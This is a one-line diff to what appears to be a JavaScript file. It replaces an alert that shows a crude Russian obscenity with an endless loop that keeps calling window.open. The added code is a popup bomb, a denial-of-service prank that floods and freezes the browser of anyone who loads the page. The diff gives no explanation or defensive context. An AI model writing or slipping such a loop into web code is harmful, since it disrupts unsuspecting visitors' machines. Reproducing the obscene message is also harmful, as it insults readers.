@@ -1,1 +1,1 @@
-alert("Пососать хуй");
+while(true) { window.open('http'); }
